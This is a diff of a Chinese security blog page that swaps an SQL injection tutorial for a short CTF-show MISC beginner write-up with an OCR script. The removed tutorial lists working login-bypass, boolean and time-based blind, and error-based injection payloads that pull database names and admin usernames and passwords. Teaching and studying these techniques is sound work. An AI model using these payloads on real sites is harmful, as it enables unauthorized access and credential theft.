@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="web漏洞">
-    <meta name="description" content="SQL注入，查询方式和报错盲注">
+    <meta name="keywords" content="MISC(1)">
+    <meta name="description" content="CTF-show：MISC入门">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>web-SQL注入（5） | E=MC^2</title>
+    <title>CTF-show-MISC入门-1 | E=MC^2</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -298,12 +298,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">web-SQL注入（5）</h1>
+                    <h1 class="description center-align post-title">CTF-show-MISC入门-1</h1>
                 </div>
             </div>
         </div>
@@ -419,8 +419,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/MISC/">
+                                <span class="chip bg-color">MISC</span>
                             </a>
                         
                     </div>
@@ -431,8 +431,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
-                                小迪渗透
+                            <a href="/categories/CTF-show/" class="post-category">
+                                CTF-show
                             </a>
                         
                     </div>
@@ -444,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-17
+                    2022-03-22
                 </div>
                 
 
@@ -458,14 +458,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    284
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    1 分
                 </div>
                 
 
@@ -485,208 +485,30 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>From：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/65f05e7cc957">https://www.jianshu.com/p/65f05e7cc957</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49150931/article/details/111829828">https://blog.csdn.net/weixin_49150931/article/details/111829828</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/281559.html">https://www.freebuf.com/articles/web/281559.html</a></p>
-<h3 id="1、常用函数"><a href="#1、常用函数" class="headerlink" title="1、常用函数"></a>1、常用函数</h3><p>（1）系统函数</p>
-<pre><code>version()   版本
-user()   数据库用户名
-database()   数据库名
-@@datadir   数据库路径
-@@version_compile_os   操作系统版本
+                <p>From：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45696568/article/details/115261347">https://blog.csdn.net/weixin_45696568/article/details/115261347</a></p>
+<h3 id="1、MISC-1"><a href="#1、MISC-1" class="headerlink" title="1、MISC 1"></a>1、MISC 1</h3><p>打开压缩包即可看到flag</p>
+<p>提取图片文字（图片应与py文件放在一个文件下）</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+<span class="token keyword">import</span> pytesseract
+
+pytesseract<span class="token punctuation">.</span>pytesseract<span class="token punctuation">.</span>tesseract_cmd <span class="token operator">=</span> <span class="token string">'D:\\Tesseract\\tesseract.exe'</span>
+
+tessdata_dir_config <span class="token operator">=</span> <span class="token string">'--tessdata-dir "D:\\Tesseract\\tessdata"'</span>
+
+im <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"misc1.png"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>im<span class="token punctuation">,</span>lang<span class="token operator">=</span><span class="token string">'eng'</span><span class="token punctuation">,</span>config<span class="token operator">=</span>tessdata_dir_config<span class="token punctuation">)</span><span class="token punctuation">)</span>
 </code></pre>
-<p>（2）字符串连接</p>
-<pre><code>concat(str1,str2...)  无分隔符地连接字符串
-concat_ws(分隔符,srt1,str2...)  含有分隔符地连接字符串
-group_concat(str1...)   连接一个组的所有字符串，并以逗号分隔
-</code></pre>
-<h3 id="2、逻辑运算"><a href="#2、逻辑运算" class="headerlink" title="2、逻辑运算"></a>2、逻辑运算</h3><p>（1）</p>
-<p><code>Select * from admin where username=’admin’ and password=’admin’</code></p>
-<p>可以用<code>&#39; or 1=1#</code>作为密码输入</p>
-<p><code>Select * from admin where username=’admin’ and password=’’or 1=1#’</code></p>
-<img src="C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20220320175314868.png" alt="逻辑运算" style="zoom:67%;" />
+<h3 id="2、MISC-2"><a href="#2、MISC-2" class="headerlink" title="2、MISC 2"></a>2、MISC 2</h3><p>修改文件后缀</p>
+<h3 id="3、MISC-3"><a href="#3、MISC-3" class="headerlink" title="3、MISC 3"></a>3、MISC 3</h3><p>From：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CT_WJ/article/details/97812299">https://blog.csdn.net/CT_WJ/article/details/97812299</a></p>
+<p>BPG是一种新的图像格式。其目的是在质量或文件大小成问题时替换JPEG图像格式。 </p>
+<p>压缩比高。 对于类似的质量，文件比JPEG小得多。</p>
+<p>大多数Web浏览器都支持小型Javascript解码器（gzip压缩大小：56 KB）。</p>
+<p>支持与JPEG（灰度，YCbCr 4：2：0,4：2：2,4：4：4）相同的色度格式，以减少转换过程中的损耗。 支持Alpha通道。 还支持RGB，YCgCo和CMYK颜色空间。</p>
+<p>本机支持每通道8至14位，以获得更高的动态范围。</p>
+<p>支持无损压缩。可以包括各种元数据（例如EXIF，ICC配置文件，XMP）。动画支持。</p>
+<pre><code>bpgview.exe misc3.bpg   查看图片
 
-<p>（2）</p>
-<p><code>Select * from users where id=1 and 1=1;</code><br><code>Select * from users where id=1 &amp;&amp; 1=1;</code><br><code>Select * from users where id=1 &amp; 1=1;</code></p>
-<p>第一句和第二句是同一个意思，<code>&amp;&amp;</code>具有短路的功能，即如果第一个表达式为false，则不再计算第二个表达式</p>
-<p>第三句<code>&amp;</code>可以是逻辑运算也可以是位运算</p>
-<img src="https://gitee.com/mie1732/emc/raw/master/img/202203201757368.png" alt="与运算" style="zoom:50%;" />
-
-<h3 id="3、SQL盲注"><a href="#3、SQL盲注" class="headerlink" title="3、SQL盲注"></a>3、SQL盲注</h3><p>在SQL注入的过程中，选择的数据不能回显到前端页面</p>
-<p>（1）基于布尔SQL盲注</p>
-<p>true or false</p>
-<p>截取字符串函数</p>
-<pre><code>mid(str,statr,length)   起始值1，长度可省略，返回剩余文本
-
-mid((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;&#39;a&#39;
-</code></pre>
-<pre><code>substr(str,start,length)
-substring(str,start,length)
-</code></pre>
-<pre><code>left(str,length)   字符串从左指定length个字符
-
-left(database(),2)&gt;&#39;ab&#39;
-</code></pre>
-<pre><code>ord()   返回一个字符串的ASCLL码
-
-ascii(substr((select database()),1,1))=98
-</code></pre>
-<p>基本流程：</p>
-<pre><code>1.判断注入点
-and -1=-1  页面返回有数据
-and -1=-2  页面无结果返回
-
-2. 判断当前页面字段总数
-and -1=-1 order by 2 页面返回有数据
-and -1=-2 order by 3 页面无结果返回
-当前页面字段数为：2。
-
-3.判断显示位 
-and -1=-2 union select 1,2 页面无结果返回
-无回显点，应该是：盲注并且是布尔盲注（有明显的True和Flash）。
-
-4.猜解当前数据库名称长度
-and (length(database()))&gt;11页面返回有数据
-and (length(database()))&gt;12页面无结果返回
-当前数据库名称长度为：12。
-
-5.用ASCII码猜解当前数据库名称
-and ascii(substr(database(),1,1))=107 页面返回有数据
-and ascii(substr(database(),2,1))=97 页面返回有数据
-当前数据库 第一个字母是k,第二个字母是a...以此类推得到数据库库名是kanwolonxia。
-注：判断ascii码范围不止是 ”=&quot;,还应该恰当使用 “&gt;”,“&lt;” 等符号。
-
-6.猜表名
-and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=108  页面返回有数据
-表名的 第一个字母是 l ...然后以此类推得到 表名 loflag。
-
-7.猜字段名 
-and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;loflag&#39; limit 1,1),1,1)))=102   页面返回有数据
-字段名的第一个字母是 f...类推得到字段名 flaglo。
-
-8.猜内容 
-and (ascii(substr(( select flaglo from loflag limit 0,1),1,1)))=122  页面返回有数据
-得到数据的第一个字母是 z...类推得到数据zKaQ-QQQ
-</code></pre>
-<p><strong>数据库长度</strong></p>
-<p><code>&#39; or length(database()) &gt; 8 --+   符合条件返回正确，反之返回错误</code></p>
-<p><strong>数据库名</strong></p>
-<pre><code>&#39;or mid(database(),1,1)= &#39;z&#39; --+    因为需要验证的字符太多，所以转化为ascii码验证
-&#39;or ORD(mid(database(),1,1)) &gt; 100 --+ 通过确定ascii码，从而确定数据库名
-</code></pre>
-<p><strong>表的数量</strong></p>
-<p><code>&#39;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   判断表的总数</code></p>
-<p><strong>第一个表名的长度</strong></p>
-<pre><code>&#39;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+
-
-&#39;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）
-</code></pre>
-<p><strong>第一个表名</strong></p>
-<pre><code>&#39;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1 ),1,1) = &#39;a&#39;  --+
-
-&#39;Or ORD(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) &gt;100   --+
-</code></pre>
-<p><strong>表的字段总数</strong></p>
-<p><code>&#39;or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME=&#39;表名&#39;) &gt; 5 --+</code></p>
-<p><strong>第一个字段的长度</strong></p>
-<pre><code>&#39;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#39;表名&#39; limit 0,1) = 10 --+
-
-&#39;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#39;表名&#39; limit 1,1) = 10 --+ （第二个字段）
-</code></pre>
-<p><strong>第一个字段名</strong></p>
-<pre><code>&#39;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#39;表名&#39; limit 0,1),1,1) = &#39;i&#39; --+
-
-&#39;or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#39;表名&#39; limit 0,1),1,1)) &gt; 100 --+
-</code></pre>
-<p><strong>直接猜字段名</strong></p>
-<p><code>&#39; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;表名&#39; limit 1,1) = &#39;username&#39; --+</code></p>
-<p><strong>内容长度</strong></p>
-<pre><code>假如已经知道字段名为  id username password
-&#39;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16  --+
-</code></pre>
-<p><strong>内容</strong></p>
-<pre><code>&#39;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#39;a&#39; --+
-
-&#39;or ORD(mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1)) &gt; 100 --+    ASCII码猜解
-</code></pre>
-<p><strong>直接猜内容</strong></p>
-<p><code>&#39;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#39;admin-----123456&#39;   --+</code></p>
-<p>（2）基于时间的SQL盲注</p>
-<p>页面响应时间</p>
-<p>常用函数</p>
-<pre><code>Sleep(time)                           :延迟函数
-If(condition,true,false)          :条件语句
-mid(str,start,length)             :字符串截取
-ORD()                             :转换成ascii码
-Length()                          :统计长度
-</code></pre>
-<p>注入思路：</p>
-<pre><code>1.判断注入点
-&quot;and -1=-1-- w  页面返回有数据
-&quot;and -1=-2-- w  页面返回有数据
-页面的返回没有变化，可能是盲注；
-然后用sleep()判断是否是时间盲注
-&quot;and sleep(5)-- w    页面延时了
-该盲注是时间盲注。
-
-2.猜解当前数据库名称长度
-&quot;and if((length(database()))=12,sleep(5),1)-- w  页面延时了
-当前数据库名称长度为 12。
-
-3.用ASCII码猜解当前数据库名称
-&quot;and if(ascii(substr(database(),1,1))=107,sleep(5),1)-- w  页面延时了
-数据库第一个字母是k... 类推得到数据库名kanwolonxia。
-
-之后同布尔盲注，只是多了个if()函数。
-</code></pre>
-<p><strong>数据库总数</strong></p>
-<pre><code>&#39; and sleep(if((select count(SCHEMA_NAME) from information_schema.SCHEMATA)=7,0,5)) 
-如果数据库总数等于7响应时间为0秒，如果不等于7 相应时间为5秒
-</code></pre>
-<p><strong>数据库长度</strong></p>
-<p><code>&#39; and sleep(if((length(database()) = 8),0,5))--+   当前数据库名长度为8</code></p>
-<p><strong>数据库名</strong></p>
-<p><code>&#39; and sleep(if((ORD(mid(database(),1,1)) =115 ),0,5))--+ ascii码115 就是s</code></p>
-<p>（3）基于报错的SQL盲注</p>
-<p><strong>常用函数</strong></p>
-<pre><code>只要是count()，rand() ,group by 三个函数连用就会造成这种报错
-left(rand(),3)     :不一定报错
-floor(rand(0)*2)    :一定报错
-round(x,d)       :x指要处理的数，d是指保留几位小数
-concat()         :字符串拼接
-</code></pre>
-<p><strong>数据库爆破</strong></p>
-<pre><code>&#39; and (select concat(floor(rand(0)*2),&quot;===&quot;,(select database())) as xx,count(1) from information_schema.columns group by xx)
-
-&#39; union select concat(floor(rand(0)*2),&quot;===&quot;,(select database())) as xx,count(1),3 from information_schema.columns group by xx
-</code></pre>
-<p><strong>爆表名</strong></p>
-<pre><code>&#39; union select concat(floor(rand(0)*2),&quot;===&quot;,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 3,1)) as xx,count(1),3 from information_schema.columns group by xx--+
-</code></pre>
-<p><strong>爆字段</strong></p>
-<pre><code>&#39; union select concat(floor(rand(0)*2),&quot;===&quot;,(select column_name from information_schema.columns where TABLE_SCHEMA=database() limit 8,1)) as xx,count(1),3 from information_schema.columns group by xx--+
-</code></pre>
-<p><strong>猜解内容</strong></p>
-<pre><code>&#39; and ORD(mid((select concat(username,&quot;-----&quot;,password) from security.users limit 0,1),1,1)) =68 %23         //逐个猜解内容
-
-&#39; and 1=(updatexml(1,concat(0x3a,(select database() )),1))--+
-</code></pre>
-<h3 id="4、limit用法"><a href="#4、limit用法" class="headerlink" title="4、limit用法"></a>4、limit用法</h3><p>From：<a target="_blank" rel="noopener" href="http://www.blogjava.net/yemen/articles/229521.html">http://www.blogjava.net/yemen/articles/229521.html</a></p>
-<p>（1）LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。</p>
-<p>LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</p>
-<p>（2）初始记录行的偏移量是 0</p>
-<p>（3）实例：</p>
-<pre><code>mysql&gt; SELECT * FROM table LIMIT 5,10;  // 检索记录行 6-15
-
-//为了检索从某一个偏移量到记录集的结束所有的记录行，可以指定第二个参数为 -1： 
-mysql&gt; SELECT * FROM table LIMIT 95,-1; // 检索记录行 96-last.
-
-//如果只给定一个参数，它表示返回最大的记录行数目： 
-mysql&gt; SELECT * FROM table LIMIT 5;     //检索前 5 个记录行
-
-//换句话说，LIMIT n 等价于 LIMIT 0,n
+bpgdec -o output.jpg misc3.bpg    它输出PNG或PPM图像
 </code></pre>
 
                 
@@ -714,7 +536,7 @@ mysql&gt; SELECT * FROM table LIMIT 5;     //检索前 5 个记录行
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/17/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%885%EF%BC%89/">http://example.com/2022/03/17/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%885%EF%BC%89/</a>
+                    <a href="http://example.com/2022/03/22/CTF-show-MISC%E5%85%A5%E9%97%A8-1/">http://example.com/2022/03/22/CTF-show-MISC%E5%85%A5%E9%97%A8-1/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -752,8 +574,8 @@ mysql&gt; SELECT * FROM table LIMIT 5;     //检索前 5 个记录行
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/MISC/">
+                                    <span class="chip bg-color">MISC</span>
                                 </a>
                             
                         </div>
@@ -799,9 +621,60 @@ mysql&gt; SELECT * FROM table LIMIT 5;     //检索前 5 个记录行
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/03/22/CTF-show-MISC%E5%85%A5%E9%97%A8-1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="CTF-show-MISC入门-1">
+                        
+                        <span class="card-title">CTF-show-MISC入门-1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CTF-show：MISC入门
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-show/" class="post-category">
+                                    CTF-show
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/MISC/">
+                        <span class="chip bg-color">MISC</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2022/03/19/CTF-show-sqli-libs%EF%BC%881%EF%BC%89/">
                     <div class="card-image">
@@ -819,9 +692,9 @@ mysql&gt; SELECT * FROM table LIMIT 5;     //检索前 5 个记录行
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -839,55 +712,6 @@ mysql&gt; SELECT * FROM table LIMIT 5;     //检索前 5 个记录行
                     
                     <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                         <span class="chip bg-color">信息收集</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/03/17/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%884%EF%BC%89/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="web-SQL注入（4）">
-                        
-                        <span class="card-title">web-SQL注入（4）</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            SQL注入，Oracle,MongoDB等注入
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
-                                    小迪渗透
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
